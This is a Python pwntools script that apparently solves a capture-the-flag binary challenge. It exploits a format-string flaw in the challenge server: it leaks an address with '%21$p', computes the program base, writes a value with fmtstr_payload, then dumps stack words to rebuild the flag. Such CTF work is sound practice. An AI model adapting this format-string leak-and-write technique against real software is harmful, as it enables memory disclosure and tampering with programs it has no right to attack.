from pwn import *
from Crypto.Util.number import *

# p = process('./load')
p = remote('binary.challs.pragyanctf.tech', 6003)
e = ELF('./load')
context.binary = e

p.sendlineafter(b'Pack\n', b'1')
p.sendlineafter(b'pack?\n', b'%21$p')

e.address = int(p.recvline()[:-1], 16) - (e.symbols['main'] + 164)
print(hex(e.address))

p.sendlineafter(b'Pack\n', b'1')
p.sendlineafter(b'pack?\n', fmtstr_payload(6, {e.symbols['b']:0xf9}))

p.sendlineafter(b'Pack\n', b'2')
p.sendlineafter(b'code:\n', b'%p.'*20)

p.recvuntil(b'coupon:\n')
l = p.recvline().split(b'.')[7:11]
flag = ''
for b in l:
    x = long_to_bytes(int(b, 16))
    flag += ''.join(list(reversed(x.decode())))
print(flag)
